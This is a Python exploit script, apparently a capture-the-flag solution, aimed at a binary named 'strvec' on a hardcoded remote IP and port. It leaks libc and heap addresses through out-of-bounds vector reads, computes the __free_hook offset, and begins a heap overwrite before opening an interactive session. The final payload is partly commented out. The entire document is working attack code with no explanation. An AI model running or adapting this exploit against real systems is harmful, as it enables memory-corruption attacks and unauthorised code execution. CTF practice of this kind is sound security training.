#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./strvec')

host = args.HOST or '168.119.108.148'
port = int(args.PORT or 12010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
break *vector_new+28
break *main+95
break *main+254
break *vector_get+49
break *vector_set+104
break *malloc+286
continue
'''.format(**locals())

# -- Exploit goes here --

def cmd(option):
    sla(b"> ", str(option).encode('utf-8'))

def get_(idx):
    cmd(1)
    sla(b"idx = ", str(idx).encode('utf'))

def set_(idx, data):
    cmd(2)
    sla(b"idx = ", str(idx).encode('utf'))
    sla(b"data = ", data)


libc = ELF("libc.so.6")
io = start()

sla(b"Name: ", b"DONOTMATTER")
sla(b"n = ", str(0x20097969).encode('utf-8'))
get_(0xd516d+17)
reu(b"vec.get(idx) -> ")
libc.address = uu64(ren(6)) - 0x1ebbe0
get_(0xd517b)
reu(b"vec.get(idx) -> ")
heap_base = uu64(ren(6)) - 0x290
heap_list = libc.address - 0x4bcfe8
offset = libc.sym['__free_hook'] - heap_list
log.info(f"libc base : {hex(libc.address)}")
log.info(f"heap base : {hex(heap_base)}")
log.info(f"heap list : {hex(libc.address-0x4bcfe8)}")
# set_(0xd5170, p64(heap_base + 0x280) + p64(0x31) + p64(libc.sym['__free_hook']-0x10) )
set_(0xd5170, p64(0x0) ) # + p64(0x31) + p64(libc.sym['__free_hook']-0x10) )
io.interactive()

